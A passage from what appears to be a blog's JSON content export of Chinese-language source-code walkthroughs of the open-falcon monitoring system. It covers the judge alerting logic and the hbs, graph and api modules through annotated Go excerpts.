{\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tsendEvent(event)\n\t\t\treturn\n\t\t}\n\n\t\t// 逻辑走到这里，说明之前Event是PROBLEM状态\n\t\tif lastEvent.CurrentStep >= maxStep {\n\t\t\t// 报警次数已经足够多，到达了最多报警次数了，不再报警\n\t\t\treturn\n\t\t}\n\n\t\tif historyData[len(historyData)-1].Timestamp <= lastEvent.EventTime {\n\t\t\t// 产生过报警的点，就不能再使用来判断了，否则容易出现一分钟报一次的情况\n\t\t\t// 只需要拿最后一个historyData来做判断即可，因为它的时间最老\n\t\t\treturn\n\t\t}\n\n\t\tif now-lastEvent.EventTime < g.Config().Alarm.MinInterval {\n\t\t\t// 报警不能太频繁，两次报警之间至少要间隔MinInterval秒，否则就不能报警\n\t\t\treturn\n\t\t}\n\n\t\tevent.CurrentStep = lastEvent.CurrentStep + 1\n\t\tsendEvent(event) //发送事件，函数将报警事件存储到redis队列中去。\n\t} else {\n\t\t// 如果LastEvent是Problem，报OK，否则啥都不做\n\t\tif exists && lastEvent.Status[0] == 'P' {\n\t\t\tevent.Status = \"OK\"\n\t\t\tevent.CurrentStep = 1\n\t\t\tsendEvent(event)\n\t\t}\n\t}\n}\n```\n\n检查表达式是否满足要求：\n\n```go\nfunc CheckExpression(L *SafeLinkedList, firstItem *model.JudgeItem, now int64) {\n\tkeys := buildKeysFromMetricAndTags(firstItem)\n\tif len(keys) == 0 {\n\t\treturn\n\t}\n\n\t// expression可能会被多次重复处理，用此数据结构保证只被处理一次\n\thandledExpression := make(map[int]struct{})\n\n\texpressionMap := g.ExpressionMap.Get()\n\tfor _, key := range keys {\n\t\texpressions, exists := expressionMap[key]\n\t\tif !exists {\n\t\t\tcontinue\n\t\t}\n\t\t//过滤相关表达式\n\t\trelated := filterRelatedExpressions(expressions, firstItem)\n\t\tfor _, exp := range related {\n\t\t\tif _, ok := handledExpression[exp.Id]; ok {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\thandledExpression[exp.Id] = struct{}{}\n\t\t\tjudgeItemWithExpression(L, exp, firstItem, now)\n\t\t}\n\t}\n}\n```\n\n类似的满足要求发送事件给redis：\n\n```go\nfunc judgeItemWithExpression(L *SafeLinkedList, expression *model.Expression, firstItem *model.JudgeItem, now int64) {\n\tfn, err := ParseFuncFromString(expression.Func, expression.Operator, expression.RightValue)\n\tif err != nil {\n\t\tlog.Printf(\"[ERROR] parse func %s fail: %v. expression id: %d\", expression.Func, err, expression.Id)\n\t\treturn\n\t}\n\n\thistoryData, leftValue, isTriggered, isEnough := fn.Compute(L)\n\tif !isEnough {\n\t\treturn\n\t}\n\n\tevent := &model.Event{\n\t\tId:         fmt.Sprintf(\"e_%d_%s\", expression.Id, firstItem.PrimaryKey()),\n\t\tExpression: expression,\n\t\tEndpoint:   firstItem.Endpoint,\n\t\tLeftValue:  leftValue,\n\t\tEventTime:  firstItem.Timestamp,\n\t\tPushedTags: firstItem.Tags,\n\t}\n\n\tsendEventIfNeed(historyData, isTriggered, now, event, expression.MaxStep)\n\n}\n```\n\n其中使用fn.Compute使用的是离群点检测函数，更多请参考3-sigma算法，https://en.wikipedia.org/wiki/68%E2%80%9395%E2%80%9399.7_rule\nstddev(#10) = 3 //取最新 **10** 个点的数据分别计算得到他们的标准差和均值，分别计为 σ 和 μ，其中当前值计为 X，那么当 X 落在区间 [μ-3σ, μ+3σ] 之外时则报警。\n\n接下来SyncStrategies函数从HBS同步策略：\n\n```go\nfunc SyncStrategies() {\n\tduration := time.Duration(g.Config().Hbs.Interval) * time.Second\n\tfor {\n\t\tsyncStrategies()   //同步策略\n\t\tsyncExpression()   //同步表达式\n\t\tsyncFilter()       //同步过滤器\n\t\ttime.Sleep(duration)\n\t}\n}\n```\n\n```go\nfunc syncStrategies() {\n\tvar strategiesResponse model.StrategiesResponse\n\terr := g.HbsClient.Call(\"Hbs.GetStrategies\", model.NullRpcRequest{}, &strategiesResponse)  //调用HBS rpc接口数据数据\n\tif err != nil {\n\t\tlog.Println(\"[ERROR] Hbs.GetStrategies:\", err)\n\t\treturn\n\t}\n\n\trebuildStrategyMap(&strategiesResponse)  //重建策略数据结构\n}\n```\n\n```go\nfunc syncExpression() {\n\tvar expressionResponse model.ExpressionResponse\n\terr := g.HbsClient.Call(\"Hbs.GetExpressions\", model.NullRpcRequest{}, &expressionResponse)   //调用HBS接口返回数据\n\tif err != nil {\n\t\tlog.Println(\"[ERROR] Hbs.GetExpressions:\", err)\n\t\treturn\n\t}\n\n\trebuildExpressionMap(&expressionResponse)  // 重建表达式数据结构\n}\n```\n\n```go\nfunc syncFilter() {\n\tm := make(map[string]string)\n\n\t//M map[string][]model.Strategy\n\tstrategyMap := g.StrategyMap.Get()\n\tfor _, strategies := range strategyMap {\n\t\tfor _, strategy := range strategies {\n\t\t\tm[strategy.Metric] = strategy.Metric\n\t\t}\n\t}\n\n\t//M map[string][]*model.Expression\n\texpressionMap := g.ExpressionMap.Get()\n\tfor _, expressions := range expressionMap {\n\t\tfor _, expression := range expressions {\n\t\t\tm[expression.Metric] = expression.Metric\n\t\t}\n\t}\n\n\tg.FilterMap.ReInit(m)  // 设置获取到的map数据结构\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon hbs 源码分析","url":"/2020/01/21/hbs源码分析/","content":"## open-falcon hbs源码分析\n\n本篇文章主要分析下open-falcon中hbs如何实现的：\n\n主流程再modules/hbs/main.go模块中：\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\t// 解析配置文件\n\tg.ParseConfig(*cfg)\n\t// 初始化数据库，检查数据库是否可以连接，连接失败退出。\n\tdb.Init()\n    // 初始化缓存，从数据库中查询数据加载到缓存中。\n\tcache.Init()\n\t// 删除没有心跳的agent\n\tgo cache.DeleteStaleAgents()\n\t// 启动hbs http服务\n\tgo http.Start()\n    // 启动 rpc服务\n\tgo rpc.Start()\n\n    //信号量检查\n\tsigs := make(chan os.Signal, 1)\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {\n\t\t<-sigs\n\t\tfmt.Println()\n\t\tdb.DB.Close()\n\t\tos.Exit(0)\n\t}()\n\n\tselect {}\n}\n```\n\ndb初始化函数Init:\n\n```go\nfunc Init() {\n\tvar err error\n\tDB, err = sql.Open(\"mysql\", g.Config().Database)\n\tif err != nil {\n\t\tlog.Fatalln(\"open db fail:\", err)\n\t}\n\n\tDB.SetMaxOpenConns(g.Config().MaxConns)\n\tDB.SetMaxIdleConns(g.Config().MaxIdle)\n\n\terr = DB.Ping()\n\tif err != nil {\n\t\tlog.Fatalln(\"ping db fail:\", err)\n\t}\n}\n```\n\n初始化缓存数据：\n\n```go\nfunc Init() {\n\tlog.Println(\"cache begin\")\n\t// 查询group与plugins的关系到缓存中\n\tlog.Println(\"#1 GroupPlugins...\")\n\tGroupPlugins.Init()\n\t// 查询group与template的关系到缓存中\n\tlog.Println(\"#2 GroupTemplates...\")\n\tGroupTemplates.Init()\n\t// 查询host与group的关系到缓存中\n\tlog.Println(\"#3 HostGroupsMap...\")\n\tHostGroupsMap.Init()\n\t//查询所有的host信息到缓存，方便查询hostname->id\n\tlog.Println(\"#4 HostMap...\")\n\tHostMap.Init()\n\t//查询所有的template信息到缓存中\n\tlog.Println(\"#5 TemplateCache...\")\n\tTemplateCache.Init()\n\t//查询对应模块的策略信息到缓存中\n\tlog.Println(\"#6 Strategies...\")\n\tStrategies.Init(TemplateCache.GetMap())\n\t//查询host与template的缓存信息，一个id对应多个模块ID\n\tlog.Println(\"#7 HostTemplateIds...\")\n\tHostTemplateIds.Init()\n\t//查询所有表达式到缓存中\n\tlog.Println(\"#8 ExpressionCache...\")\n\tExpressionCache.Init()\n\t// 查询被监控的host信息缓存\n\tlog.Println(\"#9 MonitoredHosts...\")\n\tMonitoredHosts.Init()\n\n\tlog.Println(\"cache done\")\n\t\n\tgo LoopInit() //定时查询更新，比较消耗资源。\n\n}\n```\n\n定时检查当前agents列表中的信息心跳最后更新时间：\n\n```go\nfunc deleteStaleAgents() {\n\t// 一天都没有心跳的Agent，从内存中干掉\n\tbefore := time.Now().Unix() - 3600*24\n\tkeys := Agents.Keys()\n\tcount := len(keys)\n\tif count == 0 {\n\t\treturn\n\t}\n\n\tfor i := 0; i < count; i++ {\n\t\tcurr, _ := Agents.Get(keys[i])\n\t\tif curr.LastUpdate < before {\n\t\t\tAgents.Delete(curr.ReportRequest.Hostname)\n\t\t}\n\t}\n}\n```\n\nhttp服务初始化：\n\n```go\n//init函数\nfunc init() {\n\tconfigCommonRoutes()  //注册通用api\n\tconfigProcRoutes()    //注册获取策略等信息\n}\n```\n\nrpc接口初始化：\n\n```go\nfunc Start() {\n\taddr := g.Config().Listen\n\n\tserver := rpc.NewServer()\n\t// server.Register(new(filter.Filter))\n\tserver.Register(new(Agent))\n\tserver.Register(new(Hbs))\n\n\tl, e := net.Listen(\"tcp\", addr)\n\tif e != nil {\n\t\tlog.Fatalln(\"listen error:\", e)\n\t} else {\n\t\tlog.Println(\"listening\", addr)\n\t}\n\n\tfor {\n\t\tconn, err := l.Accept()\n\t\tif err != nil {\n\t\t\tlog.Println(\"listener accept fail:\", err)\n\t\t\ttime.Sleep(time.Duration(100) * time.Millisecond)\n\t\t\tcontinue\n\t\t}\n\t\tgo server.ServeCodec(jsonrpc.NewServerCodec(conn))\n\t}\n}\n```\n\n基本流程分析完毕，我们主要来看下hbs提供出来的rpc函数有那些：\n\nagent rpc接口：\n\n```go\nMinePlugin函数主要从缓存中查询plugins插件列表\nReportStatus获取到agent来的状态数据，更新缓存中的数据\nTrustableIps白名单，从配置文件中读取\nBuiltinMetrics，agent按照server端的配置，按需采集的metric\n```\n\nhbs rpc接口：\n\n```go\nGetExpressions 获取查询表达式\nGetStrategies 获取strategy策略，用于judge调用\n```\n\n我们来看下这个函数GetStrategies，这个函数主要用于给judge定时更新策略的。\n\n```go\nfunc (t *Hbs) GetStrategies(req model.NullRpcRequest, reply *model.StrategiesResponse) error {\n\treply.HostStrategies = []*model.HostStrategy{}\n\t// 一个机器ID对应多个模板ID\n\thidTids := cache.HostTemplateIds.GetMap()\n\tsz := len(hidTids)\n\tif sz == 0 {\n\t\treturn nil\n\t}\n\n\t// Judge需要的是hostname，此处要把HostId转换为hostname\n\t// 查出的hosts，是不处于维护时间内的\n\thosts := cache.MonitoredHosts.Get()\n\tif len(hosts) == 0 {\n\t\t// 所有机器都处于维护状态，汗\n\t\treturn nil\n\t}\n\t// 查询所有模板信息\n\ttpls := cache.TemplateCache.GetMap()\n\tif len(tpls) == 0 {\n\t\treturn nil\n\t}\n\t//查询所有策略信息\n\tstrategies := cache.Strategies.GetMap()\n\tif len(strategies) == 0 {\n\t\treturn nil\n\t}\n\n\t// 做个索引，给一个tplId，可以很方便的找到对应了哪些Strategy\n\ttpl2Strategies := Tpl2Strategies(strategies)\n\n\thostStrategies := make([]*model.HostStrategy, 0, sz)\n\tfor hostId, tplIds := range hidTids {\n\n\t\th, exists := hosts[hostId]\n\t\tif !exists {\n\t\t\tcontinue\n\t\t}\n\n\t\t// 计算当前host配置了哪些监控策略\n\t\tss := CalcInheritStrategies(tpls, tplIds, tpl2Strategies)\n\t\tif len(ss) <= 0 {\n\t\t\tcontinue\n\t\t}\n\n\t\ths := model.HostStrategy{\n\t\t\tHostname:   h.Name,\n\t\t\tStrategies: ss,\n\t\t}\n\n\t\thostStrategies = append(hostStrategies, &hs)\n\n\t}\n\n\treply.HostStrategies = hostStrategies\n\treturn nil\n}\n```\n\nTpl2Strategies函数根据strategies查询所有模板信息：\n\n```go\nfunc Tpl2Strategies(strategies map[int]*model.Strategy) map[int][]*model.Strategy {\n\tret := make(map[int][]*model.Strategy)\n\tfor _, s := range strategies {\n\t\tif s == nil || s.Tpl == nil {\n\t\t\tcontinue\n\t\t}\n\t\tif _, exists := ret[s.Tpl.Id]; exists {\n\t\t\tret[s.Tpl.Id] = append(ret[s.Tpl.Id], s)\n\t\t} else {\n\t\t\tret[s.Tpl.Id] = []*model.Strategy{s}\n\t\t}\n\t}\n\treturn ret\n}\n```\n\nCalcInheritStrategies函数用于计算当前host机器有多少策略：\n\n```go\nfunc CalcInheritStrategies(allTpls map[int]*model.Template, tids []int, tpl2Strategies map[int][]*model.Strategy) []model.Strategy {\n\t// 根据模板的继承关系，找到每个机器对应的模板全量\n\t/**\n\t * host_id =>\n\t * |a |d |a |a |a |\n\t * |  |  |b |b |f |\n\t * |  |  |  |c |  |\n\t * |  |  |  |  |  |\n\t */\n\ttpl_buckets := [][]int{}\n\tfor _, tid := range tids {\n        // 查找所有id的parentid\n\t\tids := cache.ParentIds(allTpls, tid)\n\t\tif len(ids) <= 0 {\n\t\t\tcontinue\n\t\t}\n\t\ttpl_buckets = append(tpl_buckets, ids)\n\t}\n\n\t// 每个host 关联的模板，有继承关系的放到同一个bucket中，其他的放在各自单独的bucket中\n\t/**\n\t * host_id =>\n\t * |a |d |a |\n\t * |b |  |f |\n\t * |c |  |  |\n\t * |  |  |  |\n\t */\n\tcount := len(tpl_buckets)\n\tuniq_tpl_buckets := [][]int{}\n\tfor i := 0; i < count; i++ {\n\t\tvar valid bool = true\n\t\tfor j := 0; j < count; j++ {\n\t\t\tif i == j {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tif slice_int_eq(tpl_buckets[i], tpl_buckets[j]) {\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tif slice_int_lt(tpl_buckets[i], tpl_buckets[j]) {\n\t\t\t\tvalid = false\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\tif valid {\n\t\t\tuniq_tpl_buckets = append(uniq_tpl_buckets, tpl_buckets[i])\n\t\t}\n\t}\n\n\t// 继承覆盖父模板策略，得到每个模板聚合后的策略列表\n\tstrategies := []model.Strategy{}\n\n\texists_by_id := make(map[int]struct{})\n\tfor _, bucket := range uniq_tpl_buckets {\n\n\t\t// 开始计算一个桶，先计算老的tid，再计算新的，所以可以覆盖\n\t\t// 该桶最终结果\n\t\tbucket_stras_map := make(map[string][]*model.Strategy)\n\t\tfor _, tid := range bucket {\n\n\t\t\t// 一个tid对应的策略列表\n\t\t\tthe_tid_stras := make(map[string][]*model.Strategy)\n\n\t\t\tif stras, ok := tpl2Strategies[tid]; ok {\n\t\t\t\tfor _, s := range stras {\n\t\t\t\t\tuuid := fmt.Sprintf(\"metric:%s/tags:%v\", s.Metric, utils.SortedTags(s.Tags))\n\t\t\t\t\tif _, ok2 := the_tid_stras[uuid]; ok2 {\n\t\t\t\t\t\tthe_tid_stras[uuid] = append(the_tid_stras[uuid], s)\n\t\t\t\t\t} else {\n\t\t\t\t\t\tthe_tid_stras[uuid] = []*model.Strategy{s}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// 覆盖父模板\n\t\t\tfor uuid, ss := range the_tid_stras {\n\t\t\t\tbucket_stras_map[uuid] = ss\n\t\t\t}\n\t\t}\n\n\t\tlast_tid := bucket[len(bucket)-1]\n\n\t\t// 替换所有策略的模板为最年轻的模板\n\t\tfor _, ss := range bucket_stras_map {\n\t\t\tfor _, s := range ss {\n\t\t\t\tvalStrategy := *s\n\t\t\t\t// exists_by_id[s.Id] 是根据策略ID去重，不太确定是否真的需要，不过加上肯定没问题\n\t\t\t\tif _, exist := exists_by_id[valStrategy.Id]; !exist {\n\t\t\t\t\tif valStrategy.Tpl.Id != last_tid {\n\t\t\t\t\t\tvalStrategy.Tpl = allTpls[last_tid]\n\t\t\t\t\t}\n\t\t\t\t\tstrategies = append(strategies, valStrategy)\n\t\t\t\t\texists_by_id[valStrategy.Id] = struct{}{}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn strategies\n}\n```\n\nhbs中主要的功能分析完毕。相应的需要结合judge和agent来看各个rpc接口调用关系了。\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon graph 源码分析","url":"/2020/01/21/graph源码分析/","content":"## open-falcon graph源码分析\n\ngraph主流程在modules/graph/main中：\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"specify config file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tversionGit := flag.Bool(\"vg\", false, \"show version and git commit log\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\tif *versionGit {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\t// global config\n    // 解析配置文件\n\tg.ParseConfig(*cfg)\n\n\tif g.Config().Debug {\n\t\tg.InitLog(\"debug\")\n\t} else {\n\t\tg.InitLog(\"info\")\n\t}\n\n\t// init db\n    // 初始化数据库，连接不上失败\n\tg.InitDB()\n\t// rrdtool init\n    // rrd初始化\n\trrdtool.InitChannel()\n\t// rrdtool before api for disable loopback connection\n\trrdtool.Start()\n\t// start api\n\tgo api.Start()\n\t// start indexing\n    // index更新，定期刷新数据到数据库中\n\tindex.Start()\n\t// start http server\n\tgo http.Start()\n    // 定时清理无效数据\n\tgo cron.CleanCache()\n\n\tstart_signal(os.Getpid(), g.Config())\n}\n```\n\nrrdtool启动，启动协程定时写磁盘数据\n\n```go\nfunc Start() {\n\tcfg := g.Config()\n\tvar err error\n\t// check data dir\n\tif err = file.EnsureDirRW(cfg.RRD.Storage); err != nil {\n\t\tlog.Fatalln(\"rrdtool.Start error, bad data dir \"+cfg.RRD.Storage+\",\", err)\n\t}\n\t\n\tmigrate_start(cfg)\n\n\t// sync disk\n    // 写入rdd数据\n\tgo syncDisk()\n    // task不同任务刷新\n\tgo ioWorker()\n\tlog.Println(\"rrdtool.Start ok\")\n}\n```\n\napi模块启动\n\n```go\nfunc Start() {\n\tif !g.Config().Rpc.Enabled {\n\t\tlog.Println(\"rpc.Start warning, not enabled\")\n\t\treturn\n\t}\n\taddr := g.Config().Rpc.Listen\n\ttcpAddr, err := net.ResolveTCPAddr(\"tcp\", addr)\n\tif err != nil {\n\t\tlog.Fatalf(\"rpc.Start error, net.ResolveTCPAddr failed, %s\", err)\n\t}\n\n\tlistener, err := net.ListenTCP(\"tcp\", tcpAddr)\n\tif err != nil {\n\t\tlog.Fatalf(\"rpc.Start error, listen %s failed, %s\", addr, err)\n\t} else {\n\t\tlog.Println(\"rpc.Start ok, listening on\", addr)\n\t}\n\n\trpc.Register(new(Graph))  // rpc接口注册\n\n\tgo func() {\n\t\tvar tempDelay time.Duration // how long to sleep on accept failure\n\t\tfor {\n\t\t\tconn, err := listener.Accept()\n\t\t\tif err != nil {\n\t\t\t\tif tempDelay == 0 {\n\t\t\t\t\ttempDelay = 5 * time.Millisecond\n\t\t\t\t} else {\n\t\t\t\t\ttempDelay *= 2\n\t\t\t\t}\n\t\t\t\tif max := 1 * time.Second; tempDelay > max {\n\t\t\t\t\ttempDelay = max\n\t\t\t\t}\n\t\t\t\ttime.Sleep(tempDelay)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\ttempDelay = 0\n\t\t\tgo func() {\n\t\t\t\te := connects.insert(conn)\n\t\t\t\tdefer connects.remove(e)\n\t\t\t\trpc.ServeConn(conn)\n\t\t\t}()\n\t\t}\n\t}()\n\n\tselect {\n\tcase <-Close_chan:\n\t\tlog.Println(\"rpc, recv sigout and exiting...\")\n\t\tlistener.Close()\n\t\tClose_done_chan <- 1\n\n\t\tconnects.Lock()\n\t\tfor e := connects.list.Front(); e != nil; e = e.Next() {\n\t\t\te.Value.(net.Conn).Close()\n\t\t}\n\t\tconnects.Unlock()\n\n\t\treturn\n\t}\n\n}\n```\n\n接下来初始化内存索引信息：\n\n```go\nfunc Start() {\n\tInitCache()   //初始化缓存cache统计信息\n\tgo StartIndexUpdateIncrTask()   //更新索引任务\n\tlog.Debug(\"index.Start ok\")\n}\n```\n\n```go\n// 启动索引的 异步、增量更新 任务, 每隔一定时间，刷新cache中的数据到数据库中\nfunc StartIndexUpdateIncrTask() {\n\tfor {\n\t\ttime.Sleep(IndexUpdateIncrTaskSleepInterval)\n\t\tstartTs := time.Now().Unix()\n\t\tcnt := updateIndexIncr()\n\t\tendTs := time.Now().Unix()\n\t\t// statistics\n\t\tproc.IndexUpdateIncrCnt.SetCnt(int64(cnt))\n\t\tproc.IndexUpdateIncr.Incr()\n\t\tproc.IndexUpdateIncr.PutOther(\"lastStartTs\", ntime.FormatTs(startTs))\n\t\tproc.IndexUpdateIncr.PutOther(\"lastTimeConsumingInSec\", endTs-startTs)\n\t}\n}\n```\n\n主要针对一些收集到的指标数据更新到数据库中。方便后续查询和报警使用：\n\n```go\n// 进行一次增量更新\nfunc updateIndexIncr() int {\n\tret := 0\n\tif unIndexedItemCache == nil || unIndexedItemCache.Size() <= 0 {\n\t\treturn ret\n\t}\n\n\tdbConn, err := g.GetDbConn(\"UpdateIndexIncrTask\")\n\tif err != nil {\n\t\tlog.Error(\"[ERROR] get dbConn fail\", err)\n\t\treturn ret\n\t}\n\n\tkeys := unIndexedItemCache.Keys()\n\tfor _, key := range keys {\n\t\ticitem := unIndexedItemCache.Get(key)\n\t\tunIndexedItemCache.Remove(key)\n\t\tif icitem != nil {\n\t\t\t// 并发更新mysql\n\t\t\tsemaUpdateIndexIncr.Acquire()\n\t\t\tgo func(key string, icitem *IndexCacheItem, dbConn *sql.DB) {\n\t\t\t\tdefer semaUpdateIndexIncr.Release()\n\t\t\t\terr := updateIndexFromOneItem(icitem.Item, dbConn)  // 更新数据到数据库\n\t\t\t\tif err != nil {\n\t\t\t\t\tproc.IndexUpdateIncrErrorCnt.Incr()\n\t\t\t\t} else {\n\t\t\t\t\tIndexedItemCache.Put(key, icitem)\n\t\t\t\t}\n\t\t\t}(key, icitem.(*IndexCacheItem), dbConn)\n\t\t\tret++\n\t\t}\n\t}\n\n\treturn ret\n}\n```\n\nhttp服务启动\n\n```go\nfunc Start() {\n\tif !g.Config().Http.Enabled {\n\t\tlog.Println(\"http.Start warning, not enabled\")\n\t\treturn\n\t}\n\n\tif !g.Config().Debug {\n\t\tgin.SetMode(gin.ReleaseMode)\n\t}\n\n\trouter = gin.Default()\n\n\tconfigCommonRoutes()\n\tconfigProcRoutes()\n\tconfigIndexRoutes()\n\n\trouter.GET(\"/api/v2/counter/migrate\", func(c *gin.Context) {\n\t\tcounter := rrdtool.GetCounterV2()\n\t\tlog.Debug(\"migrating counter v2:\", fmt.Sprintf(\"%+v\", counter))\n\t\tc.JSON(200, counter)\n\t})\n\n\t//compatible with open-falcon v0.1\n\trouter.GET(\"/counter/migrate\", func(c *gin.Context) {\n\t\tcnt := rrdtool.GetCounter()\n\t\tlog.Debug(\"migrating counter:\", cnt)\n\t\tc.JSON(200, gin.H{\"msg\": \"ok\", \"counter\": cnt})\n\t})\n\n\taddr := g.Config().Http.Listen\n\tif addr == \"\" {\n\t\treturn\n\t}\n\tgo router.Run(addr)\n\n\tselect {\n\tcase <-Close_chan:\n\t\tlog.Info(\"http recv sigout and exit...\")\n\t\tClose_done_chan <- 1\n\t\treturn\n\t}\n\n}\n```\n\n定时清理无效数据\n\n```go\nfunc CleanCache() {\n\n\tticker := time.NewTicker(time.Duration(g.CLEAN_CACHE) * time.Second)\n\tdefer ticker.Stop()\n\tfor {\n\t\t<-ticker.C\n\t\tDeleteInvalidItems()   // 删除无效的GraphItems\n\t\tDeleteInvalidHistory() // 删除无效的HistoryCache\n\t}\n}\n```\n\n接下来还是看下graph是如何存储数据的：\n\n接收数据函数是在handleItem函数中：\n\n```go\nfunc handleItems(items []*cmodel.GraphItem) {\n\tif items == nil {\n\t\treturn\n\t}\n\n\tcount := len(items)\n\tif count == 0 {\n\t\treturn\n\t}\n\n\tcfg := g.Config()\n\n\tfor i := 0; i < count; i++ {\n\t\tif items[i] == nil {\n\t\t\tcontinue\n\t\t}\n\n\t\tendpoint := items[i].Endpoint\n\t\tif !g.IsValidString(endpoint) {\n\t\t\tlog.Debugf(\"invalid endpoint: %s\", endpoint)\n\t\t\tpfc.Meter(\"invalidEnpoint\", 1)\n\t\t\tcontinue\n\t\t}\n\n\t\tcounter := cutils.Counter(items[i].Metric, items[i].Tags)\n\t\tif !g.IsValidString(counter) {\n\t\t\tlog.Debugf(\"invalid counter: %s/%s\", endpoint, counter)\n\t\t\tpfc.Meter(\"invalidCounter\", 1)\n\t\t\tcontinue\n\t\t}\n\n\t\tdsType := items[i].DsType\n\t\tstep := items[i].Step\n\t\tchecksum := items[i].Checksum()\n\t\tkey := g.FormRrdCacheKey(checksum, dsType, step)\n\n\t\t//statistics\n\t\tproc.GraphRpcRecvCnt.Incr()\n\n\t\t// To Graph\n\t\tfirst := store.GraphItems.First(key)\n\t\tif first != nil && items[i].Timestamp <= first.Timestamp {\n\t\t\tcontinue\n\t\t}\n        // 放入缓存队列\n\t\tstore.GraphItems.PushFront(key, items[i], checksum, cfg)\n\n\t\t// To Index\n\t\tindex.ReceiveItem(items[i], checksum)\n\n\t\t// To History\n\t\tstore.AddItem(checksum, items[i])\n\t}\n}\n```\n\n接收到数据先放到缓存队列，然后写入rrd磁盘或者写入到数据库中完成存档。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon api 源码分析","url":"/2020/01/21/api源码分析/","content":"## open-falcon api源码分析\n\n主流程在module/api/main\n\n```go\nfunc main() {\n\tconfig.BinaryName = BinaryName\n\tconfig.Version = Version\n\tconfig.GitCommit = GitCommit\n\n\tcfgTmp := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\thelp := flag.Bool(\"h\", false, \"help\")\n\tflag.Parse()\n\tcfg := *cfgTmp\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\tif *help {\n\t\tflag.Usage()\n\t\tos.Exit(0)\n\t}\n\n\tviper.AddConfigPath(\".\")\n\tviper.AddConfigPath(\"/\")\n\tviper.AddConfigPath(\"./config\")\n\tviper.AddConfigPath(\"./api/config\")\n\tcfg = strings.Replace(cfg, \".json\", \"\", 1)\n\tviper.SetConfigName(cfg)\n\n\terr := viper.ReadInConfig()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n    // 日志初始化\n\terr = config.InitLog(viper.GetString(\"log_level\"))\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n    //初始化数据\n\terr = config.InitDB(viper.GetBool(\"db.db_bug\"), viper.GetViper())\n\tif err != nil {\n\t\tlog.Fatalf(\"db conn failed with error %s\", err.Error())\n\t}\n\n\tif viper.GetString(\"log_level\") != \"debug\" {\n\t\tgin.SetMode(gin.ReleaseMode)\n\t}\n    // gin初始化\n\troutes := gin.Default()\n\tif viper.GetBool(\"gen_doc\") {\n\t\tyaag.Init(&yaag.Config{\n\t\t\tOn:       true,\n\t\t\tDocTitle: \"Gin\",\n\t\t\tDocPath:  viper.GetString(\"gen_doc_path\"),\n\t\t\tBaseUrls: map[string]string{\"Production\": \"/api/v1\", \"Staging\": \"/api/v1\"},\n\t\t})\n\t\troutes.Use(yaag_gin.Document())\n\t}\n    //启动graph服务，启动服务一致性hash\n\tinitGraph()\n\t//start gin server\n\tlog.Debugf(\"will start with port:%v\", viper.GetString(\"web_port\"))\n\tgo controller.StartGin(viper.GetString(\"web_port\"), routes)\n\n\tsigs := make(chan os.Signal, 1)\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {\n\t\t<-sigs\n\t\tfmt.Println()\n\t\tos.Exit(0)\n\t}()\n\tselect {}\n}\n```\n\ninitGraph函数中启动graph服务\n\n```go\nfunc Start(addrs map[string]string) {\n\tclusterMap = addrs\n\tconnTimeout = int32(viper.GetInt(\"graphs.conn_timeout\"))\n\tcallTimeout = int32(viper.GetInt(\"graphs.call_timeout\"))\n\tfor c := range clusterMap {\n\t\tgcluster = append(gcluster, c)\n\t}\n\tdefer func() {\n\t\tif r := recover(); r != nil {\n\t\t\tlog.Errorf(\"graph got painc:%v\", r)\n\t\t\tStart(clusterMap)\n\t\t}\n\t}()\n\tinitNodeRings(clusterMap)  //初始化一致性hash\n\tinitConnPools(clusterMap)  //初始化rpc连接池\n\tlog.Println(\"graph.Start ok\")\n}\n```\n\n\n\nStartGin注册路由并启动：\n\n```go\nfunc StartGin(port string, r *gin.Engine) {\n\tr.Use(utils.CORS())\n\tr.GET(\"/\", func(c *gin.Context) {\n\t\tc.String(http.StatusOK, \"Hello, I'm Falcon+ 